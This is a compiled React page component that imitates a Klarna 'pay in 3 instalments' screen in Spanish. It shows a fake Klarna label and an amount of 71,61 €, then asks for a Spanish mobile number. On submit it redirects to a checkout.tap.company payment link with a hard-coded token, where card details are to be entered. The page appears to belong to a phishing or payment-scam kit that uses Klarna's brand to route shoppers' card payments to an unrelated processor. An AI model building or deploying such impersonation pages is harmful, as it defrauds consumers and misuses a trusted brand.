import { N as reactExports, G as jsxRuntimeExports } from "./server-DUxKx5xb.js";
import { u as useNavigate } from "./router-D80unHli.js";
import { P as PhoneShell } from "./PhoneShell-CtxupxdS.js";
import "node:async_hooks";
import "node:stream/web";
import "node:stream";
function KlarnaPage() {
  useNavigate();
  const [phone, setPhone] = reactExports.useState("");
  const onSubmit = (e) => {
    e.preventDefault();
    window.location.href = "https://checkout.tap.company/?mode=page&themeMode=&language=en&token=eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjZhMDg1ODY0NjVjNjg3NzVlODYxYTc0YyJ9.j4gs7IqNmhbBEEsM9lYzYRvVPcNs1iBDtgCeHY8jq7A";
  };
  return /* @__PURE__ */ jsxRuntimeExports.jsxs(PhoneShell, { showHelp: false, children: [
    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-center mt-4 mb-4", children: /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "px-4 py-2 rounded-lg bg-[#FFA8CD] text-black font-bold text-2xl tracking-tight", children: "Klarna." }) }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("h1", { className: "text-xl font-bold text-center", children: "Paga en 3 plazos sin intereses" }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-center text-sm text-gray-600 mt-2 mb-5", children: "Introduce tu número de móvil para continuar" }),
    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "rounded-xl border border-gray-200 p-4 space-y-2 text-sm", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsx(Row, { label: "Hoy", value: "71,61 €" }),
      /* @__PURE__ */ jsxRuntimeExports.jsx(Row, { label: "En 30 días", value: "71,61 €" }),
      /* @__PURE__ */ jsxRuntimeExports.jsx(Row, { label: "En 60 días", value: "71,61€" })
    ] }),
    /* @__PURE__ */ jsxRuntimeExports.jsxs("form", { onSubmit, className: "mt-6 space-y-4", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx("label", { className: "text-xs text-gray-600", children: "Número de móvil" }),
        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-1 flex", children: [
          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "inline-flex items-center px-3 border border-r-0 border-gray-300 rounded-l-lg text-sm bg-gray-50", children: "+34" }),
          /* @__PURE__ */ jsxRuntimeExports.jsx("input", { type: "tel", required: true, value: phone, onChange: (e) => setPhone(e.target.value), placeholder: "600 000 000", className: "flex-1 border border-gray-300 rounded-r-lg px-4 py-3 text-sm focus:outline-none focus:border-black" })
        ] })
      ] }),
      /* @__PURE__ */ jsxRuntimeExports.jsx("button", { type: "submit", className: "w-full py-3.5 rounded-full bg-black hover:bg-gray-800 transition text-white font-semibold text-sm", children: "Continuar" }),
      /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-center text-xs text-gray-500", children: "Al confirmar, te pediremos los datos de tu tarjeta para finalizar el pago." })
    ] })
  ] });
}
function Row({
  label,
  value
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex justify-between", children: [
    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-700", children: label }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "font-semibold", children: value })
  ] });
}
export {
  KlarnaPage as component
};
